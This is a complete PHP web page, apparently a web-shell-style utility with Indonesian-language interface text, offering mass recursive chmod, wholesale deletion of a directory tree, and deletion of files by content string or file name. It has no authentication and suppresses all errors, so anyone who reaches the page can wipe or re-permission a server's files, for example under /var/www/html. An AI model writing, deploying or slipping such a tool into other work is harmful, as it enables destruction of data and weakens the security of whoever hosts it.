<?php
error_reporting(0);
set_time_limit(0);

// === Fungsi Rekursif CHMOD dengan opsi target ===
function chmodMass($dir, $perm, $target = 'both') {
    $result = ['files' => 0, 'dirs' => 0];
    if (!is_dir($dir)) return $result;
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($path)) {
            // jika target include dirs, ubah permission direktori
            if ($target === 'both' || $target === 'dirs') {
                if (@chmod($path, $perm)) $result['dirs']++;
            }
            // lalu rekursif
            $sub = chmodMass($path, $perm, $target);
            $result['files'] += $sub['files'];
            $result['dirs'] += $sub['dirs'];
        } else {
            // file
            if ($target === 'both' || $target === 'files') {
                if (@chmod($path, $perm)) $result['files']++;
            }
        }
    }
    return $result;
}

function deleteMass($dir) {
    if (!file_exists($dir)) return;
    if (is_file($dir) || is_link($dir)) {
        @unlink($dir);
        return;
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        deleteMass($dir . DIRECTORY_SEPARATOR . $item);
    }
    @rmdir($dir);
}

function deleteByString($dir, $string) {
    $deleted = [];
    if (!is_dir($dir)) return $deleted;
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $deleted = array_merge($deleted, deleteByString($path, $string));
        } else {
            $content = @file_get_contents($path);
            if ($content !== false && stripos($content, $string) !== false) {
                if (@unlink($path)) $deleted[] = $path;
            }
        }
    }
    return $deleted;
}

function deleteByName($dir, $keyword) {
    $deleted = [];
    if (!is_dir($dir)) return $deleted;
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $deleted = array_merge($deleted, deleteByName($path, $keyword));
        } else {
            if (stripos($item, $keyword) !== false) {
                if (@unlink($path)) $deleted[] = $path;
            }
        }
    }
    return $deleted;
}

// === Proses Form ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $path   = $_POST['path'] ?? getcwd();
    $action = $_POST['action'] ?? '';
    // validasi permission: ambil hanya angka 0-7, tapi biarkan string kosong jika user tidak isi
    $perm_input = $_POST['perm'] ?? '';
    $perm_filtered = preg_replace('/[^0-7]/', '', $perm_input);
    // fallback permission default (octal) jika tidak valid
    $perm = ($perm_filtered !== '') ? octdec($perm_filtered) : 0755;

    $string = $_POST['string'] ?? '';
    $keyword = $_POST['keyword'] ?? '';
    $chmod_target = $_POST['chmod_target'] ?? 'both'; // 'files'|'dirs'|'both'
    $msg = '';

    switch ($action) {
        case 'chmod':
            // lakukan chmod massal sesuai target
            $counts = chmodMass($path, $perm, $chmod_target);
            $perm_display = ($perm_filtered !== '') ? $perm_filtered : '0755';
            $msg = "✅ CHMOD massal selesai di <b>" . htmlspecialchars($path) . "</b> dengan permission <b>$perm_display</b> untuk <b>$chmod_target</b>.";
            $msg .= "<br>🔧 File diubah: <b>" . intval($counts['files']) . "</b>, Direktori diubah: <b>" . intval($counts['dirs']) . "</b>.";
            break;

        case 'delete_all':
            deleteMass($path);
            $msg = "🗑️ Hapus massal selesai untuk direktori <b>" . htmlspecialchars($path) . "</b>";
            break;

        case 'delete_string':
            $deletedFiles = deleteByString($path, $string);
            $count = count($deletedFiles);
            $msg = "🧹 Dihapus <b>$count</b> file yang mengandung string '<b>" . htmlspecialchars($string) . "</b>'.<br>";
            if ($count > 0)
                $msg .= "<details><summary>Lihat daftar file</summary><pre style='text-align:left;'>" . htmlspecialchars(implode("\n", $deletedFiles)) . "</pre></details>";
            break;

        case 'delete_name':
            $deletedFiles = deleteByName($path, $keyword);
            $count = count($deletedFiles);
            $msg = "🗂️ Dihapus <b>$count</b> file yang namanya mengandung '<b>" . htmlspecialchars($keyword) . "</b>'.<br>";
            if ($count > 0)
                $msg .= "<details><summary>Lihat daftar file</summary><pre style='text-align:left;'>" . htmlspecialchars(implode("\n", $deletedFiles)) . "</pre></details>";
            break;

        default:
            $msg = "⚠️ Aksi tidak dikenal.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Mass CHMOD / Delete / Cleaner</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background: #0d1117;
            color: #e6edf3;
            text-align: center;
            margin-top: 5%;
        }
        input, select, button {
            padding: 10px;
            margin: 5px;
            border-radius: 6px;
            border: 1px solid #30363d;
            background: #161b22;
            color: #e6edf3;
            width: 340px;
        }
        button {
            background: #238636;
            cursor: pointer;
        }
        button:hover {
            background: #2ea043;
        }
        .msg {
            margin-top: 20px;
            color: #58a6ff;
            max-width: 80%;
            margin-left: auto;
            margin-right: auto;
        }
        details {
            margin-top: 10px;
            text-align: left;
            background: #161b22;
            padding: 10px;
            border-radius: 6px;
        }
        .radio-row {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin: 8px 0;
        }
        .radio-row label {
            background: #0b1220;
            padding: 6px 10px;
            border-radius: 6px;
            border: 1px solid #22272b;
            cursor: pointer;
        }
        .radio-row input { width: auto; margin-right:6px; }
    </style>
</head>
<body>
    <h2>🛠️ PHP Mass Tools</h2>
    <form method="POST">
        <input type="text" name="path" placeholder="Path target (contoh: /var/www/html)" value="<?= htmlspecialchars($_POST['path'] ?? getcwd()) ?>" required><br>

        <select name="action" id="action" onchange="toggleFields()">
            <option value="chmod" <?= (isset($_POST['action']) && $_POST['action']=='chmod') ? 'selected' : '' ?>>CHMOD Massal</option>
            <option value="delete_all" <?= (isset($_POST['action']) && $_POST['action']=='delete_all') ? 'selected' : '' ?>>Hapus Semua File</option>
            <option value="delete_string" <?= (isset($_POST['action']) && $_POST['action']=='delete_string') ? 'selected' : '' ?>>Hapus Berdasarkan Isi (String)</option>
            <option value="delete_name" <?= (isset($_POST['action']) && $_POST['action']=='delete_name') ? 'selected' : '' ?>>Hapus Berdasarkan Nama File</option>
        </select><br>

        <!-- Opsi CHMOD: permission + target (files/dirs/both) -->
        <input type="text" name="perm" id="permField" placeholder="Permission (misal: 0755 atau 755)" value="<?= htmlspecialchars($_POST['perm'] ?? '0755') ?>"><br>

        <div id="chmodTarget" class="radio-row" style="display:inline-block;">
            <label><input type="radio" name="chmod_target" value="both" <?= (!isset($_POST['chmod_target']) || $_POST['chmod_target']==='both') ? 'checked' : '' ?>> Keduanya</label>
            <label><input type="radio" name="chmod_target" value="files" <?= (isset($_POST['chmod_target']) && $_POST['chmod_target']==='files') ? 'checked' : '' ?>> File saja</label>
            <label><input type="radio" name="chmod_target" value="dirs" <?= (isset($_POST['chmod_target']) && $_POST['chmod_target']==='dirs') ? 'checked' : '' ?>> Direktori saja</label>
        </div>

        <input type="text" name="string" id="stringField" placeholder="String dalam file" style="display:none;"><br>
        <input type="text" name="keyword" id="nameField" placeholder="Kata pada nama file" style="display:none;"><br>

        <button type="submit">Jalankan</button>
    </form>

    <?php if (isset($msg) && $msg !== ''): ?>
        <div class="msg"><?= $msg ?></div>
    <?php endif; ?>

    <script>
        function toggleFields() {
            let action = document.getElementById("action").value;
            document.getElementById("permField").style.display = (action === "chmod") ? "inline-block" : "none";
            document.getElementById("chmodTarget").style.display = (action === "chmod") ? "block" : "none";
            document.getElementById("stringField").style.display = (action === "delete_string") ? "inline-block" : "none";
            document.getElementById("nameField").style.display = (action === "delete_name") ? "inline-block" : "none";
        }
        toggleFields();
    </script>
</body>
</html>
